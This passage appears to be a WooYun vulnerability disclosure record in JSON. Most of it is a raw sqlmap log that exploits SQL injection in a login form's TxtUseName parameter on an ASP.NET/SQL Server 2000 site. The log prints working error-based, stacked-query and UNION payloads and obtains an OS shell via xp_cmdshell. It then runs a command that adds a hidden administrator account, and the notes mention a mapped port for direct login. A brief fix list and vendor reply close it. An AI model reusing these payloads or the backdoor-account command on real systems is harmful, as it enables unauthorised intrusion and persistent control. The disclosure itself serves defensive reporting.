wait..[22:04:46] [WARNING] time-based standard deviation method used on a model with less than 30 response timesdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n][22:04:49] [INFO] xp_cmdshell extended procedure is available[22:04:50] [INFO] testing if xp_cmdshell extended procedure is usable[22:04:50] [INFO] the SQL query used returns 1 entries[22:04:52] [INFO] the SQL query used returns 1 entries[22:04:58] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors[22:05:09] [INFO] adjusting time delay to 1 second due to good response times[22:05:27] [INFO] xp_cmdshell extended procedure is usable[22:05:27] [INFO] going to use xp_cmdshell extended procedure for operating system command execution[22:05:27] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTERos-shell> ipconfigdo you want to retrieve the command standard output? [Y/n/a][22:05:52] [INFO] the SQL query used returns 14 entries[22:05:56] [INFO] the SQL query used returns 14 entries[22:05:57] [INFO] retrieved: Windows IP Configuration[22:05:57] [INFO] retrieved:[22:05:58] [INFO] retrieved:[22:05:58] [INFO] retrieved: Ethernet adapter 本地连接 2:[22:05:58] [INFO] retrieved:[22:05:58] [INFO] retrieved:  \\\\\\\\?a0\\\\\\\\?a0Media State . . . . . . . . . . . :Media disconnected[22:05:59] [INFO] retrieved:[22:05:59] [INFO] retrieved: Ethernet adapter 本地连接 3:[22:05:59] [INFO] retrieved:[22:05:59] [INFO] retrieved:  \\\\\\\\?a0\\\\\\\\?a0Connection-specific DNS Suffix \\\\\\\\?a0\\\\\\\\?2e :[22:06:00] [INFO] retrieved:  \\\\\\\\?a0\\\\\\\\?a0IP Address. . . . . . . . . . . . :192.168.1.100[22:06:00] [INFO] retrieved:  \\\\\\\\?a0\\\\\\\\?a0Subnet Mask . . . . . . . . . . . :255.255.255.0[22:06:00] [INFO] retrieved:  \\\\\\\\?a0\\\\\\\\?a0Default Gateway . . . . . . . . . :192.168.1.1[22:06:00] [INFO] retrieved: 15[22:06:07] [INFO] retrieved:[22:06:14] [INFO] retrieved:[22:06:20] [ERROR] invalid character detected. retrying..[22:06:20] [WARNING] increasing time delay to 2 secondsWindows IP Con[22:08:57] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 34 times[22:08:57] [ERROR] user aborted[*] shutting down at 22:08:57C:\\Users\\Administrator>python C:\\Users\\Administrator\\Desktop\\sqlmapproject-sqlmap-aee4c93\\sqlmap.py -r C:\\Users\\Administrator\\Desktop\\sqlmapproject-sqlmap-aee4c93\\1.txt -p TxtUseName --os-shell         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150906}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 22:09:00[22:09:00] [INFO] parsing HTTP request from 'C:\\Users\\Administrator\\Desktop\\sqlmapproject-sqlmap-aee4c93\\1.txt'[22:09:01] [INFO] resuming back-end DBMS 'microsoft sql server'[22:09:01] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: TxtUseName (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=123&TxtDataYear=fgssccrbsp_jx_JX12&Sel_DataYear=fgssccrbsp_jx_JX12&TxtUseName=123' AND 1781=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1781=1781) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'ptag'='ptag    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: TxtPassword=123&TxtDataYear=fgssccrbsp_jx_JX12&Sel_DataYear=fgssccrbsp_jx_JX12&TxtUseName=123';WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=123&TxtDataYear=fgssccrbsp_jx_JX12&Sel_DataYear=fgssccrbsp_jx_JX12&TxtUseName=123' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(122)+CHAR(98)+CHAR(122)+CHAR(113)+CHAR(71)+CHAR(76)+CHAR(76)+CHAR(118)+CHAR(108)+CHAR(105)+CHAR(122)+CHAR(111)+CHAR(104)+CHAR(110)+CHAR(113)+CHAR(98)+CHAR(107)+CHAR(113)+CHAR(113),NULL,NULL,NULL-----[22:09:01] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000[22:09:01] [INFO] testing if current user is DBA[22:09:02] [INFO] testing if xp_cmdshell extended procedure is usable[22:09:03] [INFO] the SQL query used returns 1 entries[22:09:04] [INFO] the SQL query used returns 1 entries[22:09:12] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n][22:09:36] [INFO] adjusting time delay to 1 second due to good response times[22:09:51] [INFO] xp_cmdshell extended procedure is usable[22:09:51] [INFO] going to use xp_cmdshell extended procedure for operating system command execution[22:09:51] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTERos-shell> net user jianfen$ jia*** /add && net localgroup administrators jianfen$ /adddo you want to retrieve the command standard output? [Y/n/a][22:10:12] [INFO] the SQL query used returns 2 entries[22:10:13] [INFO] the SQL query used returns 2 entries[22:10:13] [INFO] retrieved:[22:10:13] [INFO] retrieved: 5[22:10:18] [INFO] retrieved: 絔\n映射端口为3434直接登录服务器\n\n\n\n   漏洞证明：  web.config数据库外联之\n\n   修复方案：  1.修复sql注入2.降权3. H1 大哥   版权声明：转载请注明来源 jianFen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-09-14 11:21 厂商回复： 感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}